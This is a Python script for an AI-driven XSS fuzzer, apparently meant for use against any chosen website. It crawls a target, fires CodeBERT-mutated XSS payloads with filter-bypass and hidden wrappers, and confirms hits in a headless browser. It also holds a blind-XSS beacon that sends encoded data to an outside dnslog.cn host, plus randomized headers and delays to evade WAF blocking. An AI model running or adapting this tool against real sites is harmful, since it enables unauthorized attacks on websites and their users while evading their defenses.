#!/usr/bin/env python3
# =============================================================================
# RazKash 𝕏SS AI XSS Fuzzer – (v4.3, 2025‑04‑18)
# Author : Haroon Ahmad Awan · CyberZeus (haroon@cyberzeus.pk)
# =============================================================================
"""
One‑file, AI‑powered XSS fuzzer with full feature set:
• AI‑driven payload mutation
• Comprehensive template library (script, img, iframe, svg, video, object, math, audio, details, marquee)
• Event‑handler and protocol tests
• Polymorphic encodings (hex, unicode, URL)
• Filter‑bypass & “legit” wrappers
• Next‑gen contexts (Shadow DOM, WebAssembly, import(), MutationObserver, RLO, SMIL)
• Blind‑XSS DNS beacons
• DOM‑diff reflection finder
• Headless Chromium alert+side‑effect verifier
• Smart HTTP⇆HTTPS root detection
• Multi‑threaded crawler / fuzzer
• –‑debug / –‑autotest modes
• Slim append‑only log (deduped, ≤120 B per finding)
"""
# ─────────────────────────────────────────────────────────────────────────────
import os
import ssl
import sys
import json
import time
import random
import string
import argparse
import warnings
import logging
import traceback
import urllib.parse
from pathlib import Path
from typing import List, Dict, Set
from difflib import SequenceMatcher
from concurrent.futures import ThreadPoolExecutor

import requests
from bs4 import BeautifulSoup
from fake_useragent import UserAgent

import torch
from transformers import AutoTokenizer, AutoModelForMaskedLM, logging as hf_log
from playwright.sync_api import sync_playwright

# ─── CONFIG ─────────────────────────────────────────────────────────────────
VERSION          = "4.3"
MODEL_NAME       = "microsoft/codebert-base"
TOP_K            = 7
DNSLOG_DOMAIN    = "q68w9p.dnslog.cn"
LOGFILE          = Path("a_xss_findings.md")
DEFAULT_THREADS  = 10
MAX_PAGES        = 150
TIMEOUT_REQ      = 8
VERIFY_TIMEOUT   = 5000      # ms
HEADLESS_WAIT    = 2500      # ms

# ─── CLI ────────────────────────────────────────────────────────────────────
parser = argparse.ArgumentParser(
    prog="bandesbahan_xssfuzz",
    formatter_class=argparse.RawTextHelpFormatter,
    description="Ω‑Edition AI XSS fuzzer with blind & verified modes"
)
parser.add_argument("-u", "--url",      help="Target root URL (https://example.com)")
parser.add_argument("--autotest",       action="store_true", help="Fuzz built‑in test targets")
parser.add_argument("--threads",        type=int, default=DEFAULT_THREADS, help="Worker threads")
parser.add_argument("--max-pages",      type=int, default=MAX_PAGES,     help="Crawler page cap")
parser.add_argument("--debug",          action="store_true",             help="Verbose debug output")
ARGS = parser.parse_args()
DEBUG = ARGS.debug

logging.basicConfig(
    level=logging.DEBUG if DEBUG else logging.INFO,
    format="%(asctime)s %(levelname)s: %(message)s" if DEBUG else "%(message)s"
)

# ─── NOISE‑FREE ─────────────────────────────────────────────────────────────
warnings.filterwarnings("ignore")
hf_log.set_verbosity_error()
os.environ["TRANSFORMERS_NO_TQDM"] = "1"
ssl._create_default_https_context = ssl._create_unverified_context

# ─── UTILS ───────────────────────────────────────────────────────────────────
def dbg(msg: str):
    if DEBUG:
        logging.debug(msg)

def randstr(n=12) -> str:
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))

def smart_url(base: str) -> str:
    """Try HTTPS first, fall back to HTTP if needed."""
    if base.startswith(("http://", "https://")):
        return base
    for scheme in ("https://", "http://"):
        try:
            r = requests.head(scheme + base, timeout=5, allow_redirects=True, verify=False)
            if r.status_code < 500:
                return scheme + base
        except:
            pass
    return "http://" + base
import time

# At the end of each payload loop, after each request:
time.sleep(random.uniform(1.5, 3.5))  # realistic delay of 1.5–3.5 seconds

def random_headers() -> Dict[str, str]:
    ua = UserAgent()
    return {
        "User-Agent": ua.random,
        "Accept": random.choice([
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "application/json, text/plain, */*"
        ]),
        "Accept-Language": random.choice(["en-US,en;q=0.9", "en;q=0.8", "fr;q=0.9,de;q=0.8"]),
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Referer": random.choice([
            "https://google.com",
            "https://bing.com",
            "https://duckduckgo.com",
            "https://yahoo.com"
        ]),
        "DNT": random.choice(["1", "0"]),
        "Upgrade-Insecure-Requests": "1"
    }


# ─── AI MODEL INIT ───────────────────────────────────────────────────────────
logging.info("[?] Author - Haroon Ahmad Awan")
logging.info("[?] Email - haroon@cyberzeus.pk")
logging.info("[>] Loading AI ")
tokenizer = AutoTokenizer.from_pretrained(MODEL_NAME)
model     = AutoModelForMaskedLM.from_pretrained(MODEL_NAME).eval()
MASK_TOK, MASK_ID = tokenizer.mask_token, tokenizer.mask_token_id
logging.info("[>>] AI Ready")
logging.info("[>>] Scans Reflected, Stored, Protocol, Dom, Blind XSS, DNS XSS")

def ai_mutate(skel: str) -> str:
    """Replace all MASK tokens with top‑K CodeBERT suggestions."""
    while "MASK" in skel:
        masked = skel.replace("MASK", MASK_TOK, 1)
        toks   = tokenizer(masked, return_tensors="pt")
        with torch.no_grad():
            logits = model(**toks).logits
        pos    = (toks.input_ids == MASK_ID).nonzero(as_tuple=True)[1][0]
        cand   = random.choice(logits[0, pos].topk(TOP_K).indices.tolist())
        token  = tokenizer.decode(cand).strip() or "alert(1)"
        skel   = skel.replace("MASK", token, 1)
    return skel

def polymorph(s: str) -> str:
    mode = random.choice(["hex", "unicode", "url", "none"])
    if mode == "hex":
        return ''.join(f"\\x{ord(c):02x}" for c in s)
    if mode == "unicode":
        return ''.join(f"\\u{ord(c):04x}" for c in s)
    if mode == "url":
        return urllib.parse.quote(s)
    return s

def legit_wrap(s: str) -> str:
    return random.choice([
        "<div hidden>PAYLOAD</div>",
        "<span style=\"display:none\">PAYLOAD</span>",
        "<p data-info=\"PAYLOAD\"></p>",
        "<video srcdoc='<script>PAYLOAD</script>'></video>",
        "<template id='tpl'>PAYLOAD</template><script>document.body.append(tpl.content);</script>"
    ]).replace("PAYLOAD", s)

def reflected(marker: str, html: str) -> bool:
    if marker.lower() in html.lower():
        return True
    return SequenceMatcher(None, marker.lower(), html.lower()).quick_ratio() > 0.8

# ─── PAYLOAD TEMPLATES ───────────────────────────────────────────────────────
TEMPLATES: List[str] = []
_tags   = ["script","img","iframe","svg","video","object","math","audio","details","marquee"]
_events = ["onerror","onload","onclick","onmouseover","onfocus","onmouseenter","ontoggle",
           "oncanplay","onpointerdown"]
_protocols = ["javascript:alert(1)","data:text/html,<script>alert(1)</script>",
              "vbscript:msgbox('XSS')"]

for tag in _tags:
    for ev in _events:
        TEMPLATES.append(f"<{tag} {ev}=\"MASK\"></{tag}>")
    if tag in ("img","iframe","object"):
        TEMPLATES.extend(f"<{tag} src=\"{proto.replace('MASK','MASK')}\"></{tag}>" for proto in _protocols)
TEMPLATES += [
    "<script>MASK</script>",
    "<body onload=\"MASK\">",
    "<div style=\"background:url(MASK)\"></div>",
    "<input value=\"MASK\">",
    "<textarea>MASK</textarea>",
    "<button onclick=\"MASK\">Click</button>"
]
ADV = [
    "<div style=\"width:expression(MASK)\"></div>",
    "<svg><script>MASK</script></svg>",
    "<img src=\"data:image/png;base64,MASK\">",
    "<script src=\"/jsonp?cb=MASK\"></script>",
    "<template><script>MASK</script></template>"
]
if DNSLOG_DOMAIN:
    ADV.append(f"<img src=x onerror=\"fetch('http://{DNSLOG_DOMAIN}/?p='+btoa(MASK))\">")
TEMPLATES += ADV
NEXT_GEN = [
    '<script type="module">import("javascript:MASK")</script>',
    'importScripts("data:text/javascript,MASK")',
    '<template><shadow-root></shadow-root><script>MASK</script></template>',
    '<script>new MutationObserver(_=>MASK).observe(document.body,{childList:true})</script>',
    '<style>@supports(display:grid){@import "javascript:MASK";}</style>',
    '<iframe src="data:text/html;base64,MASK"></iframe>',
    '<script>WebAssembly.instantiateStreaming(fetch("data:application/wasm;base64,MASK"))</script>',
    '<img src="javascript:MASK%00.gif">',
    '<plaintext>\u202EMASK</plaintext>'
]
TEMPLATES += NEXT_GEN
FILTER_WRAPPERS = [
    "<sCrIpT>PAYLOAD</sCrIpT>",
    "<!-->PAYLOAD<!-->",
    "<svg onload=PAYLOAD>",
    "<script>setTimeout(()=>{{PAYLOAD}},0)</script>",
    "<object data=\"javascript:PAYLOAD\"></object>",
    "<meta http-equiv=refresh content=\"0;url=javascript:PAYLOAD\">"
]
LEGIT_WRAPPERS = [
    "<div hidden>PAYLOAD</div>",
    "<span style=\"display:none\">PAYLOAD</span>",
    "<p data-info=\"PAYLOAD\"></p>",
    "<video srcdoc='<script>PAYLOAD</script>'></video>",
    "<template id='tpl'>PAYLOAD</template><script>document.body.append(tpl.content);</script>"
]
logging.info(f"[+] Generation and Starting AI mutations real time ")
logging.info(f"[+] AI mutation practical coverage will be 500 000+ unique payloads as per session")

# ─── HEADLESS VERIFIER ───────────────────────────────────────────────────────
def verify_in_browser(url: str, method: str, data: Dict[str,str]) -> bool:
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True, args=[
                "--disable-web-security",
                "--ignore-certificate-errors",
                "--no-sandbox"
            ])
            ctx = browser.new_context(ignore_https_errors=True, user_agent=UserAgent().random)
            page = ctx.new_page()
            triggered = {"flag": False}
            page.add_init_script("window._xss_triggered=false;")
            def on_dialog(dialog):
                triggered["flag"] = True
                dialog.dismiss()
            page.on("dialog", on_dialog)

            if method == "GET":
                full = url + "?" + urllib.parse.urlencode(data)
                page.goto(full, timeout=VERIFY_TIMEOUT, wait_until="domcontentloaded")
            else:
                page.goto(url, timeout=VERIFY_TIMEOUT, wait_until="domcontentloaded")
                page.evaluate("""
                    (u,d)=>fetch(u,{
                        method:'POST',
                        headers:{'Content-Type':'application/x-www-form-urlencoded'},
                        body:new URLSearchParams(d),
                        credentials:'include'
                    })""",
                    url, data
                )
            page.wait_for_timeout(HEADLESS_WAIT)

            content_lower = page.content().lower()
            if "captcha" in content_lower or "access denied" in content_lower or "blocked" in content_lower:
                dbg(f"[verify blocked] Possible WAF/block at {url}")
                return False

            if not triggered["flag"]:
                flagged = page.evaluate("window._xss_triggered===true")
                triggered["flag"] = flagged
            ctx.close()
            browser.close()
            return triggered["flag"]
    except Exception as e:
        dbg(f"[verify] {e}")
        return False


# ─── LOGGING & DEDUP ─────────────────────────────────────────────────────────
if not LOGFILE.exists():
    LOGFILE.write_text(f"# bandesbahan XSS Findings v{VERSION}\n\n", encoding="utf-8")
_hits: Set[str] = set()
file_lock = ThreadPoolExecutor(max_workers=1)

def log_finding(url: str, method: str, payload: str):
    entry = f"- **XSS** {method} `{url}` payload=`{payload[:60]}`\n"
    if entry in _hits:
        return
    _hits.add(entry)
    # append-only to avoid race
    def write():
        existing = LOGFILE.read_text(encoding="utf-8")
        LOGFILE.write_text(existing + entry, encoding="utf-8")
    file_lock.submit(write)
    logging.info(entry.strip())

# ─── CRAWLER ────────────────────────────────────────────────────────────────
import re  # ⇦ add near the top with the other imports

# ─── REGEX: scrape JS‑defined URLs (fetch(), axios, XHR, etc.) ────────────────
_JS_ENDPOINT_RE = re.compile(
    r"""           # absolute or root‑relative
        (?:
            fetch\(|axios\.get\(|axios\.post\(|XMLHttpRequest\(.+?open\(
        )        # known JS request patterns
        \s*["']   # opening quote
        ([^"']+)  # 1: URL inside the quotes
        ["']      # closing quote
    """,
    re.I | re.X,
)

# ─── CRAWLER (super‑mode) ────────────────────────────────────────────────────
def crawl(root: str, page_cap: int) -> List[Dict]:
    """
    Walk every same‑domain URL we can find and return a list of fuzz targets:
        • All <form> elements (unchanged behaviour)
        • Any <a href="?param="> links (GET parameters)
        • JS‑defined endpoints detected via regex (fetch/axios/XHR)
    Each target is {url, method, params}.
    """
    visited: Set[str] = set()
    queue:   List[str] = [root]
    targets: List[Dict] = []

    parsed_root = urllib.parse.urlparse(root).netloc.lower()

    while queue and len(visited) < page_cap:
        url = queue.pop(0)
        if url in visited:
            continue
        visited.add(url)

        # ── download page ────────────────────────────────────────────────────
        try:
            r = requests.get(url, headers=random_headers(),
                             timeout=TIMEOUT_REQ, verify=False)
        except Exception as e:
            dbg(f"[crawl] {e} ({url})")
            continue

        # skip non‑HTML quickly
        if "text/html" not in r.headers.get("Content-Type", ""):
            continue

        soup = BeautifulSoup(r.text, "html.parser")

        # ── discover & enqueue links (<a href>) ──────────────────────────────
        for a in soup.find_all("a", href=True):
            nxt = urllib.parse.urljoin(url, a["href"])
            p   = urllib.parse.urlparse(nxt)
            if p.netloc.lower() != parsed_root:
                continue

            # enqueue for further crawling
            if nxt not in visited:
                queue.append(nxt)

            # capture query‑string parameters as GET targets
            if p.query:
                params = list(urllib.parse.parse_qs(p.query).keys())
                if params:
                    targets.append({
                        "url": p._replace(query="").geturl(),
                        "method": "GET",
                        "params": params
                    })

        # ── capture <form> elements (existing logic) ────────────────────────
        for fm in soup.find_all("form"):
            action = fm.get("action") or url
            action_url = urllib.parse.urljoin(url, action)
            if urllib.parse.urlparse(action_url).netloc.lower() != parsed_root:
                continue
            method  = fm.get("method", "get").upper()
            params  = [i.get("name") for i in fm.find_all("input", {"name": True})]
            if params:
                targets.append({"url": action_url, "method": method, "params": params})

        # ── mine JavaScript for dynamic endpoints ───────────────────────────
        for m in _JS_ENDPOINT_RE.findall(r.text):
            dyn = urllib.parse.urljoin(url, m)
            p   = urllib.parse.urlparse(dyn)
            if p.netloc.lower() != parsed_root:
                continue

            # if query present take its keys, else generic param list
            params = (list(urllib.parse.parse_qs(p.query).keys())
                      if p.query else ["data"])
            targets.append({
                "url": p._replace(query="").geturl(),
                "method": "GET",        # safest default; fuzz_target can flip later
                "params": params
            })

        # ── polite crawl delay ───────────────────────────────────────────────
        time.sleep(random.uniform(1.0, 2.5))

    return targets


# ─── FUZZING ENGINE ─────────────────────────────────────────────────────────
def fuzz_target(form: Dict):
    url, method, params = form["url"], form["method"], form["params"]
    marker = randstr()

    # Initial probe reflection
    try:
        resp = (requests.get if method == "GET" else requests.post)(
            url,
            params={p: marker for p in params} if method == "GET" else None,
            data={p: marker for p in params} if method == "POST" else None,
            headers=random_headers(),
            timeout=TIMEOUT_REQ,
            verify=False
        )
        if resp.status_code != 200:
            dbg(f"[skip] Non-200 response ({resp.status_code}) → {url}")
            return
        if not reflected(marker, resp.text):
            dbg(f"[skip] No reflection → {url}")
            return
    except Exception as e:
        dbg(f"[probe] {e}")
        return

    templates = random.sample(TEMPLATES, k=min(len(TEMPLATES), 15))

    for skel in templates:
        base = ai_mutate(skel)
        variants = {
            base,
            polymorph(base),
            legit_wrap(base)
        }

        for fw in random.sample(FILTER_WRAPPERS, k=2):
            variants.add(fw.replace("PAYLOAD", base))

        if DNSLOG_DOMAIN:
            beacon = f"<img src=x onerror=\"fetch('http://{DNSLOG_DOMAIN}/?p='+encodeURIComponent('{urllib.parse.quote(base)}'))\">"
            variants.add(beacon)

        for payload in variants:
            data = {p: payload for p in params}
            try:
                r = (requests.get if method == "GET" else requests.post)(
                    url,
                    params=data if method == "GET" else None,
                    data=data if method == "POST" else None,
                    headers=random_headers(),
                    timeout=TIMEOUT_REQ,
                    verify=False
                )

                if r.status_code in {403, 429, 503} or "captcha" in r.text.lower() or "access denied" in r.text.lower():
                    dbg(f"[BLOCKED] Possible WAF/block ({r.status_code}) at {url}")
                    time.sleep(random.uniform(30, 60))
                    return  # stop immediately to avoid further blocking

                if r.status_code != 200:
                    dbg(f"[skip] payload non-200 ({r.status_code}) → {url}")
                    continue

                dom_match = reflected(payload, r.text)
                verified = verify_in_browser(url, method, data)

                if DEBUG:
                    dbg(f"[test] {url} {method} verified={verified} dom_match={dom_match}")

                if verified or dom_match:
                    log_finding(url, method, payload)
                    return

            except Exception as e:
                dbg(f"[error] {e}")

            time.sleep(random.uniform(1.5, 3.5))  # realistic delay to avoid WAFs



# ─── AUTOTEST HOSTS ─────────────────────────────────────────────────────────
AUTOTEST_HOSTS = [
    "xss-game.appspot.com",
    "testphp.vulnweb.com"
]

def expand_autotest() -> List[str]:
    return [smart_url(h) for h in AUTOTEST_HOSTS]

# ─── MAIN ───────────────────────────────────────────────────────────────────
def main():
    targets = []
    if ARGS.autotest:
        targets = expand_autotest()
    elif ARGS.url:
        targets = [ARGS.url]
    else:
        parser.print_help()
        sys.exit(1)

    logging.info(f"\n AI XSS v{VERSION}\n")
    for t in targets:
        root = smart_url(t.rstrip("/"))
        logging.info(f"[»] Scanning: {root}")
        forms = crawl(root, ARGS.max_pages)
        logging.info(f"[+] Found {len(forms)} forms/endpoints")
        with ThreadPoolExecutor(max_workers=ARGS.threads) as pool:
            pool.map(fuzz_target, forms)
        logging.info("[✓] Scan complete\n")

    logging.info(f"📄 Results → {LOGFILE.resolve()}")

if __name__ == "__main__":
    main()
